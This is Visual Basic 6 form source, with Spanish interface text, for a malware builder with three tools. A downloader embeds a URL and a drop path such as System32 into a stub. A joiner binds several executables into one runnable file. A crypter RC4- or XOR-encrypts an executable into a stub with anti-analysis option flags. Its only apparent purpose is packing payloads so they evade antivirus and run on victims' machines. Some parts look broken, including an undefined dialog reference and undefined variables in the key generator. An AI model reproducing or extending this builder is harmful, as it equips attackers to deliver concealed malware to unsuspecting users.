    Picture1.Visible = True
    lblDown.Visible = False
    lblJoiner.Visible = False
    lblCrypter.Visible = True
    Picture2.Visible = False
    Picture3.Visible = False
    Picture4.Visible = False
End Sub

Private Sub Button2_Click()
    Image2.Visible = False
    Image3.Visible = True
    Image4.Visible = False
    Image5.Visible = False
    lblDown.Visible = False
    lblCrypter.Visible = False
    Picture1.Visible = False
    Picture3.Visible = False
    lblJoiner.Visible = True
    Picture2.Visible = True
    Picture4.Visible = False
End Sub

Private Sub Button3_Click()
    Image2.Visible = False
    Image3.Visible = False
    Image4.Visible = True
    Image5.Visible = False
    Picture1.Visible = False
    lblDown.Visible = True
    Picture3.Visible = True
    lblJoiner.Visible = False
    lblCrypter.Visible = False
    Picture2.Visible = False
    Picture4.Visible = False
End Sub

Private Sub Button4_Click()
    Image2.Visible = False
    Image3.Visible = False
    Image4.Visible = False
    Image5.Visible = True
    Picture1.Visible = False
    lblDown.Visible = False
    lblCrypter.Visible = False
    Picture2.Visible = False
    lblJoiner.Visible = False
    Picture3.Visible = False
    Picture4.Visible = True
End Sub

Private Sub Form_Load()
    Image2.Visible = True
    Image3.Visible = False
    Image4.Visible = False
    Image5.Visible = False
    Picture1.Visible = True
    lblCrypter.Visible = True
    lblDown.Visible = False
    lblJoiner.Visible = False
    Picture2.Visible = False
    Picture3.Visible = False
    Picture4.Visible = False
End Sub


'======================================================================================
'//-> DOWNLOADER
'======================================================================================


Private Sub optWindir_Click()

If optWindir.Value = True Then
    txtRuta.Text = "C:\WINDOWS\"
End If
End Sub

Private Sub optSystem32_Click()
    If optSystem32.Value = True Then
    txtRuta.Text = "C:\WINDOWS\System32\"
End If
End Sub

Private Sub optSystem_Click()
    If optSystem.Value = True Then
    txtRuta.Text = "C:\WINDOWS\System\"
End If
End Sub

Private Sub optApp_Click()
    If optApp.Value = True Then
    txtRuta.Text = "C:\Archivos de Programa\"
End If
End Sub

Private Sub cmdDownloader_Click()

If txtNombre.Text = vbNullString Then Exit Sub
    

Dim RutaFinal   As String

RutaFinal = txtRuta.Text & txtNombre.Text

With CD
    .DialogTitle = "Selecciona donde deseas guardar el Archivo!"
    .Filter = "Archivos Ejecutables EXE|*.exe"
    .ShowSave
End With

If CD.FileName = vbNullString Then
    MsgBox "Colocale un nombre al Archivo", vbInformation
Exit Sub

End If

Dim TODOS   As String

Open App.Path & "\StubDownloader.exe" For Binary As #1
    TODOS = Space(LOF(1))
    Get #1, , TODOS
Close #1

Dim TODOCD  As String

Open CD3.FileName For Binary As #1
    TODOCD = Space(LOF(1))
    Get #1, , TODOCD
        Put #1, , TODOS
        Put #1, , TODOCD & "DOWN"
        Put #1, , RutaFinal & "DOWN"
        Put #1, , txtURL.Text & "DOWN"
    Close #1
End Sub

'======================================================================================
'//-> JOINER
'======================================================================================


Private Sub LV1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

    If Button = vbRightButton Then
    
        If LV1.ListItems.Count > 0 Then Del.Enabled = True Else Del.Enabled = False
        If LV1.ListItems.Count > 0 Then Clear.Enabled = True Else Clear.Enabled = False
        If LV1.ListItems.Count > 0 Then Extractin.Enabled = True Else Extractin.Enabled = False
        If LV1.ListItems.Count > 0 Then Execute.Enabled = True Else Execute.Enabled = False
        If LV1.ListItems.Count > 0 Then sJoin.Enabled = True Else sJoin.Enabled = False
        
        PopupMenu Menu
    
    End If
    
End Sub

Private Sub No_Click()
    LV1.SelectedItem.SubItems(3) = "No"
End Sub


Private Sub sJoin_Click()
    
    Dim i As Integer, Data As String, Todo As String, Stub As String
    
    With CD
        .DialogTitle = "Seleccione donde guardar el archivo juntado"
        .Filter = "Aplicaciones EXE|*.exe"
        .ShowSave
    End With
    
    If CD.FileName <> vbNullString Then
        
        Open App.Path & "\StubJoiner.exe" For Binary As #1
            Stub = Space$(LOF(1))
            Get #1, , Stub
        Close #1
        
        Open CD.FileName For Binary As 1
        Put 1, , Stub
        
        
    
        For i = 1 To LV1.ListItems.Count
    
            Open LV1.ListItems(i).Text For Binary As #1
                Data = Space$(LOF(1))
                Get #1, , Data
            Close #1
        
    Put 1, , "·$%&/((" & "=)(/" & Data & "=)(/" & LV1.ListItems(i).Text & "=)(/" & LV1.ListItems(i).SubItems(2) & "=)(/" & LV1.ListItems(i).SubItems(3) & "=)(/"
    
    
        Next i
        Close 1
    End If
    

    
    CD.FileName = vbNullString
    
End Sub

Private Sub Temp_Click()
    LV1.SelectedItem.SubItems(2) = "%Temp%"
End Sub

Private Sub WinDir_Click()
    LV1.SelectedItem.SubItems(2) = "%WinDir%"
End Sub

Private Sub yes_Click()
    LV1.SelectedItem.SubItems(3) = "Yes"
End Sub

Private Sub add_Click()

    With CD
        .DialogTitle = "Seleccione un archivo para juntar!"
        .Filter = "Todos los archivos|*.*"
        .flags = cdlOFNFileMustExist
        .ShowOpen
    End With
    
   If Dir(CD.FileName, vbArchive) = "" Then Exit Sub
   
   

        With LV1.ListItems.add(, , CD.FileTitle)
            .SubItems(1) = CD.FileName
            .SubItems(2) = "%AppData%"
            .SubItems(3) = "Si"
       
        End With
    

    
    CD.FileName = vbNullString

End Sub

Public Function ExtaerCaracter(sData As String, caracter As String) As String
    ExtaerCaracter = Right$(sData, Len(sData) - InStrRev(sData, caracter))
End Function

Private Sub AppData_Click()
    LV1.SelectedItem.SubItems(2) = "%AppData%"
End Sub

Private Sub Clear_Click()
    LV1.ListItems.Clear
End Sub

Private Sub Del_Click()
    LV1.ListItems.Remove (LV1.SelectedItem.Index)
End Sub

'======================================================================================
'//-> CRYPTER
'======================================================================================

'//-> BUSCAR ARCHIVO
Private Sub cmdBuscarC_Click()
With CD
    .DialogTitle = "Selecciona el Archivo a Encriptar"
    .Filter = "Aplicaciones Ejecutables EXE|*exe"
    .ShowOpen
End With

If Dir(CD.FileName) = vbNullString Then Exit Sub
    txtFile = CD.FileName
End Sub

'//-> ENCRIPTAR
Private Sub cmdCrearC_Click()

Dim StubCrypter     As String

If txtFile.Text = vbNullString Then
    MsgBox "No se ha seleccionado ningún Archivo a encriptar", vbInformation
    Exit Sub
End If

With CD
    .DialogTitle = "Selccione la ruta donde desea guardar el Archivo encriptado"
    .Filter = "Archivos Ejecutables EXE|*.exe"
    .ShowSave
End With

Open App.Path & "\" & "StubCrypter.dll" For Binary As #1
    StubCrypter = Space(LOF(1))
    Get #1, , StubCrypter
Close #1

Dim Enc     As String
Dim EOF     As String
Dim File    As String

If chkEOF.Value = 1 Then EOF = ReadEOFData(txtFile.Text)

Open txtFile.Text For Binary As #1
    File = Space(LOF(1))
    Get #1, , File
Close #1

Dim RC4     As New clsRC4
Dim xXor    As New clsXOR

If optRC4.Value = True Then
    File = RC4.EncryptString(File, txtKey.Text)
    Enc = "xRC4"
End If

If optXOR.Value = True Then
    File = xXor.EncryptString(File, txtKey.Text)
    Enc = "xXOR"
End If

Dim Datos   As String
Dim Datos2  As String

Datos = StubCrypter & "WR" & File & "WR" & Enc & "WR" & txtKey.Text & "WR"
Datos2 = Check1.Value & "ANTIS" & Check2.Value & "ANTIS" & Check3.Value & "ANTIS" & Check4.Value & "ANTIS" & Check5.Value & "ANTIS" & Check6.Value & "ANTIS" & Check7.Value & "ANTIS" & Check8.Value & "ANTIS"

Open CD.FileName For Binary As #1
    Put #1, , Datos & "ANTIS"
    Put #1, , Datos2
Close #1

If chkEOF.Value = 1 Then Call WriteEOFData(CD.FileName, EOF)
End Sub

'//->RANDOMIZE
Public Function sRandom()
Dim zeichen As String
Dim i As Integer

zeichen = a + B + C

For i = 1 To 50
    sRandom = sRandom & Mid$(zeichen, Int((Rnd * Len(zeichen)) + 1), 1)
Next i
End Function

'//->KEY
Private Sub cmdGenerar_Click()
txtKey.Text = sRandom
End Sub
